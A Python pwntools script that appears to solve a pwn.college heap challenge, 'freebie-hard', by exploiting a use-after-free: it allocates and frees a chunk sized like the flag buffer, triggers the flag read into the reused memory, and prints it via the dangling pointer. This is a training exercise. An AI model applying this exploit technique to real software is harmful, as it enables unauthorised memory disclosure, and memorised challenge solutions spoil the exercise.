#!/usr/bin/env python3
# pwn.college/program-security/dynamic-allocator-misuse/
# Challenge: freebie-hard
# Exploit: Use-After-Free to read flag

from pwn import *

# Set context
context.arch = "amd64"

# Start the challenge process
io = process("/challenge/freebie-hard")

# Receive welcome messages
io.recvuntil(b"quit): ")

# Step 1: Allocate a chunk that matches the read_flag allocation size (0x3de = 990 bytes)
# The heap allocator will round this up, but we want something close
log.info("Step 1: Allocating memory chunk (size 990)")
io.sendline(b"malloc")
io.recvuntil(b"Size: ")
io.sendline(b"990")
io.recvuntil(b"quit): ")

# Step 2: Free the chunk - creates a dangling pointer
log.info("Step 2: Freeing the chunk (creating dangling pointer)")
io.sendline(b"free")
io.recvuntil(b"quit): ")

# Step 3: Trigger read_flag - this will allocate 0x3de bytes and read flag into it
# The allocator may reuse our freed chunk!
log.info("Step 3: Triggering read_flag (reuses freed memory)")
io.sendline(b"read_flag")
io.recvuntil(b"quit): ")

# Step 4: Use puts with the dangling pointer to read the flag
log.info("Step 4: Reading flag via use-after-free")
io.sendline(b"puts")
io.recvuntil(b"Data: ")

# Get the flag
flag = io.recvline()
log.success(f"Flag: {flag.decode().strip()}")

# Clean exit
io.sendline(b"quit")
io.close()
